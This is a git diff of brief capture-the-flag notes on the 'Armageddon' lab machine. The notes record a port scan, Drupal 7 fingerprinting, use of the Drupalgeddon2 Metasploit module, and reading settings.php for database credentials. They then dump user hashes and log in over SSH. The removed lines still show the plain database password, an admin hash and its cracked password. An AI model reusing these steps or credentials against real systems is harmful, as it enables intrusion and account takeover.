@@ -1,4 +1,4 @@
-Nmap 
+#Nmap 
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
@@ -16,7 +16,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
 |_http-title: Welcome to  Armageddon |  Armageddon
 
-Techonologies
+#Techonologies
 
 CMS -  Drupal 7 
 Web sever - Apache/2.4.6
@@ -25,14 +25,14 @@ Prog Lang - PHP/5.4.16
 Got Metasploit exploit for Drupal 7
 https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/
 
-after getting meterpreter session then open the shell and look for settings.php
+After getting meterpreter session then open the shell and look for settings.php
 cd .. && cd html/sites/defalut && cat settings.php 
 
 while look into settings.php got mysql credentials.
 
 database' => 'drupal',
       'username' => 'drupaluser',
-      'password' => 'CQHEy@9M*m23gBVj',
+      'password' => 'CQHE****3gBVj',
       'host' => 'localhost',
       'port' => '',
       'driver' => 'mysql',
@@ -45,10 +45,8 @@ select * from users
 ;
 show
 
-brucetherealadmin      $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt   admin@armageddon.eu
-						
-						booboo
-
+brucetherealadmin      $S$DgL2gjv6ZtxBo6C*************.oOsUf1xAhaadURt   admin@armageddon.eu
+					
 ssh brucetherealadmin@10.10.10.223
 
 cat user.txt
